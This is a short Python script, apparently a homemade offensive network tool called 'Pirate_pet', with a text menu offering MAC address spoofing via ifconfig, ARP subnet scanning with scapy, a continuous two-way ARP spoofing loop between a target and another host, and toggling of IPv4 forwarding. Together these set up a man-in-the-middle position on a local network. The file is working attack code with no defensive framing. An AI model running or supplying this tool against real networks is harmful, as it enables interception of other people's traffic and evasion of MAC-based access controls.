from subprocess import call
import scapy.all as scapy
from time import sleep


#  logica

class Pirate_pet:
    def mac_chenger(interface, new_mac):
        # TODO del temp if
        if interface == '':
            interface = 'eth0'
        if new_mac == '':
            new_mac = '00:11:22:33:44:55'

        call(['ifconfig', interface, 'hw', 'ether', new_mac])

    def scan(ip):
        # TODO del temp if
        if ip == '':
            ip = '10.0.2.1/24'

        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request = scapy.ARP(pdst=ip)
        arp_broadcast_request = broadcast/arp_request
        
        answered_list = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
        client_list = [{'ip': el[1].psrc, 'mac': el[1].hwsrc} for el in answered_list]

        return client_list


    def arp_spoof(target_ip, spoof_ip):
        target_mac = Pirate_pet.scan(target_ip)[0]['mac']

        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        scapy.send(packet)
        

    def ip_forward(flag):
        if flag == '1':
            call(['sysctl', '-w', 'net.ipv4.ip_forward=1'])
        elif flag == '0':
            call(['sysctl', '-w', 'net.ipv4.ip_forward=0'])
        



#   vivod

command = input('''
    1. mac_chenger
    2. scan
    3. arp_spoof
    4. ip_forward\n
inter number command
> \
''')
print('')


if command == '1':
    interface = input('inter interface ')
    new_mac = input('inter new mac')

    Pirate_pet.mac_chenger(interface, new_mac)
    call(['ifconfig'])

elif command == '2':
    ip = input('inter ip scan network ')

    client_list = Pirate_pet.scan(ip)
    [print(el['ip'], '\t\t', el['mac']) for el in client_list]

elif command == '3':
    spoof_ip = input('inter spoof_ip ')
    target_ip = input('inter target_ip ')

    while True:
        Pirate_pet.arp_spoof(target_ip, spoof_ip)
        Pirate_pet.arp_spoof(spoof_ip, target_ip)
        sleep(2)

elif command == '4':
    call(['sysctl', 'net.ipv4.ip_forward'])
    
    flag = input('inter ip_forward 1 or 0 ')
    
    Pirate_pet.ip_forward(flag)


